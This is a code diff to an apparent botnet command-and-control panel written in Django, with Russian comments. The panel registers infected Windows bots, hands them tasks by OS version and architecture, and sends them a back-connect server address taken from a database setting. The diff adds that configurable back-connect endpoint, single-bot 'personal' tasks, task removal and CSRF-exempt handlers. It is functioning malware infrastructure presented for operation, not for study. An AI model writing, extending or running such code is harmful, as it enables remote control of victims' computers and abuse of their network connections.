@@ -5,7 +5,7 @@ from django.contrib.auth.models import User
 from django.contrib.auth import login, logout
 from django.views.decorators.csrf import csrf_exempt
 from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
-from .models import Bot, Session, Task
+from .models import Bot, Session, Task, IPBackConnect
 import datetime
 import struct
 import requests
@@ -160,6 +160,10 @@ class AdminPanel:
     def get_settings_page(request):
         return render(request, 'main/settings.html')
 
+    @staticmethod
+    def get_personal_task(request):
+        uid = request.GET['uid']
+        return render(request, 'main/personal_task.html', {'uid': uid})
 
 # ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\
 
@@ -332,12 +336,13 @@ class Handlers:
                     task_win = 'win7'
                 elif _bot.is_win10:
                     task_win = 'win10'
+                elif _bot.is_win8:
+                    task_win = 'win8'
 
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
-                                                                 task.xoc == 'x32_64') or (
-                                     task.winos == 'all_win' or task_win in task.winos.split(':'))]
+                                                                 task.xoc == 'x32_64') and (
+                                 task.winos == 'all_win' or task_win in task.winos.split(':')) and task.personal is False]
 
-                print(tasks, 'tasks')
                 for task in tasks:
                     _bot.tasks.add(task)
 
@@ -346,7 +351,7 @@ class Handlers:
                 res = PanelMsg.RegistrationResult()
                 res.result = True
                 res.dummy = False
-
+                print(res.SerializeToString())
                 return HttpResponse(res.SerializeToString())
 
             except Exception as e:
@@ -356,6 +361,7 @@ class Handlers:
                 res.result = False
                 res.dummy = True
 
+                print(res.SerializeToString())
                 return HttpResponse(res.SerializeToString())
 
         elif msg_type == 2:
@@ -382,10 +388,12 @@ class Handlers:
             giveaway = PanelMsg.TaskGiveaway()
             giveaway.is_empty = False
 
+            data = IPBackConnect.objects.get(id=1).data.split(':')
+
             giveaway.task.type = s[task.type1]
             giveaway.task.task_id = str(task.id).encode('utf-16-le')
-            giveaway.task.server = '127.0.0.1'
-            giveaway.task.port = 8000
+            giveaway.task.server = data[0]
+            giveaway.task.port = int(data[1])
 
             return HttpResponse(giveaway.SerializeToString())
 
@@ -396,9 +404,19 @@ class Handlers:
                 task_id = task.task_id.decode('utf-16-le')
                 _task = Task.objects.get(id=task_id)
                 _task.done += 1
-                print(True)
-                if _task.done >= _task.repetitions:
+
+                if _task.done == _task.repetitions:
                     _task.completed = True
+                    _task.save()
+                    bots = Bot.objects.filter(tasks=_task)
+                    for bot in bots:
+                        bot.tasks.remove(_task)
+                elif _task.done > _task.repetitions:
+                    _task.done -= 1
+                    _task.save()
+                    bots = Bot.objects.filter(tasks=_task)
+                    for bot in bots:
+                        bot.tasks.remove(_task)
                 else:
                     _task.save()
                 return HttpResponse('200')
@@ -449,25 +467,77 @@ class Handlers:
         }
 
         bots = [s[win] for win in wins if len(s[win]) != 0]
-        print(bots)
         try:
             if 'x32_64' in x_oc:
                 _bots = [bot for bot in bots[0] if bot.is_banned is False]
             else:
                 _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
-                     is False]
+                         is False]
         except:
             _bots = []
-        print(_bots)
 
         task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
                     repetitions=data['reps'],
                     done=0)
         task.save()
-
+        print(_bots, 'bots')
         for bot in _bots:
             bot.tasks.add(task)
 
         return HttpResponse('200')
+
+    @staticmethod
+    @csrf_exempt
+    def change_ip_backconnect(request):
+        data = request.POST['data']
+
+        try:
+            post = IPBackConnect.objects.get(id=1)
+            post.data = data
+            post.save()
+        except Exception as e:
+            post = IPBackConnect(data=data)
+            post.save()
+
+        return HttpResponse('200')
+
+    @staticmethod
+    @csrf_exempt
+    def create_personal_task(request):
+        uid = request.POST['uid']
+        _type = request.POST['type']
+        name = request.POST['name']
+
+        bot = Bot.objects.get(uid=uid)
+
+        if bot.is_win81:
+            task_win = 'win81'
+        elif bot.is_win7:
+            task_win = 'win7'
+        elif bot.is_win10:
+            task_win = 'win10'
+        elif bot.is_win8:
+            task_win = 'win8'
+
+        if bot.is_x64:
+            xoc = 'x64'
+        else:
+            xoc = 'x32'
+
+        task = Task(name=name, personal=True, country=bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc, type1=_type)
+        task.save()
+
+        bot.tasks.add(task)
+
+        return JsonResponse({'v': '200'})
+
+    @staticmethod
+    @csrf_exempt
+    def remove_task(request):
+        _id = request.POST['id']
+        task = Task.objects.get(id=_id)
+        task.delete()
+        return JsonResponse({'v': '200'})
+
 
 # ОБРАБОТЧИКИ -------------------------------------------- /
